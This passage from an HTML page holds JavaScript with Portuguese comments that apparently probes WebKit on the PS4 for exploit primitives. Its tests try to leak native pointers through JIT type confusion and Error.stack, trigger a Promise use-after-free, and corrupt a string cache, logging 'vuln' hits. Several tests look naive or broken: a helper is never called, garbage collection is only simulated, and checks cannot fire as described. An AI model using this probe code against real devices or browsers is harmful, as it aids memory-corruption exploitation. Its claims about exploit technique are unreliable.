                function read(r) { return r.lastIndex; }
                
                // Treina JIT (mas aqui o JIT pode esperar objeto)
                // O truque é confundir o tipo de retorno
                
                const val = re.lastIndex; // Leitura direta
                
                // Em exploits antigos, lastIndex podia ser lido cru
                // Se val for o objeto, é normal. Se for um número estranho...
                if (typeof val === 'number' && val > 10000) {
                     log(`RegExp Pointer Leak: ${d2h(val)}`, "vuln");
                } else {
                    log("lastIndex retornou objeto ou foi convertido.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: Error.stack Native Pointer Extraction ---
        // Alvo: _Unwind_Resume (Libc).
        // A stack trace contém endereços de retorno. Em alguns firmwares, eles não são simbolizados.
        // Procuramos por endereços no intervalo Userland (0x...)
        function runErrorStackLeak() {
            try {
                const err = new Error();
                const stack = err.stack;
                if (!stack) return log("Sem stack trace.", "safe");

                // Procura hexadecimais de 64-bit (ex: 0x00000008xxxxxxxx)
                // O WebKit no PS4 carrega em endereços altos ou randomizados
                const matches = stack.match(/0x[0-9a-fA-F]{8,16}/g);
                
                if (matches) {
                    // Filtra endereços muito baixos (provavelmente contadores)
                    const ptrs = matches.filter(m => parseInt(m, 16) > 0x100000);
                    if (ptrs.length > 0) {
                        log(`Endereços Nativos Encontrados: ${ptrs.join(", ")}`, "vuln");
                    } else {
                        log("Apenas endereços baixos/inválidos.", "safe");
                    }
                } else {
                    log("Stack limpa.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 4: PromiseReactionJob UAF Read ---
        // Alvo: Use-After-Free na fila de microtarefas.
        // Tenta usar uma Promise resolvida para acessar um objeto que foi destruído.
        function runPromiseReaction() {
            try {
                let target = { x: 1 };
                let p = Promise.resolve(target);
                
                // Liberta referência
                target = null;
                
                // Tenta forçar GC (simulado por alocação massiva)
                const pressure = new ArrayBuffer(10 * 1024 * 1024);
                
                p.then((val) => {
                    // Se val foi corrompido ou aponta para memória reutilizada
                    if (val && val.x !== 1) {
                        log("Promise retornou objeto corrompido (UAF).", "vuln");
                    } else {
                        log("Promise manteve referência viva (Safe).", "safe");
                    }
                });
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 5: JSStringImpl Header Leak ---
        // Alvo: Cabeçalho interno de Strings.
        // Tenta ler o tamanho ou flags da string confundindo-a com um Array.
        function runStringImplLeak() {
            try {
                const s = "AAAA";
                const arr = [1.1];
                
                function getFirst(o) { return o[0]; }
                
                for(let i=0; i<10000; i++) getFirst(arr);
                
                // Passa string. Se o JIT tratar como array de doubles...
                // O primeiro qword de uma string é o header (flags + length)
                const val = getFirst(s);
                
                // Se val for 'A' ou undefined, é seguro.
                // Se for um número gigante, lemos o header.
                if (typeof val === 'number' && val > 1000) {
                    log(`String Header Leak: ${d2h(val)}`, "vuln");
                } else {
                    log("String lida corretamente.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 6: Double-to-String Cache Leak ---
        // Alvo: Cache de conversão de números.
        // O WebKit faz cache de toString de números. Tenta corromper esse cache.
        function runDoubleToString() {
            try {
                const n = 1.23456789;
                const s1 = n.toString();
                
                // Tenta forçar uma condição de memória que afete o cache
                const hammer = [];
                for(let i=0; i<1000; i++) hammer.push({a:i});
                
                const s2 = n.toString();
                
                if (s1 !== s2) {
                    log(`Cache Corruption! ${s1} vs ${s2}`, "vuln");
                } else {
                    // Teste de endereço: conseguimos ler o endereço da string em cache?
                    // Requer AddrOf, mas aqui testamos consistência.
                    log("Cache de Strings consistente.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }



    </script>
</body>
</html>
